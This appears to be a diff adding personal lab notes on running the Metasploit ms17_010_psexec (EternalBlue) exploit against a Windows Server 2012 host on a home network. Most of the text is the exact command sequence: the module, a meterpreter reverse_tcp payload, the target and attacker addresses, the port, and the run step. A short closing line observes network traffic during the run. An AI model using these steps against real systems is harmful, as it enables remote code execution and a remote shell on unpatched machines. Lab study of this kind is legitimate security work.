@@ -1,0 +1,25 @@
+notes on ms17_010_psexec exploit
+
+This is an eternal blue exploit apparently developed by the NSA. 
+Metasploit has put this exploit on the tool, so we will be using
+that to compromise and execute code on a Windows server 2012 machine
+sitting on our home network.
+
+The attacker machine we will be using is sitting on the ip address 
+192.168.35.10
+
+The target machine is sitting on the ip address 
+192.168.35.200
+
+The following commands will run the exploit:
+
+1. use exploit/windows/smb/ms17_010_psexec
+2. set payload windows/x64/meterpreter/reverse_tcp
+3. set RHOSTS 192.168.35.200
+4. set LHOST 192.168.35.10
+5. set LPORT 80
+6. run
+
+In the background, we will be recording the network traffic on another machine, 
+.5, as well as the attacker machine
+nothing could be seen on the .5 machine
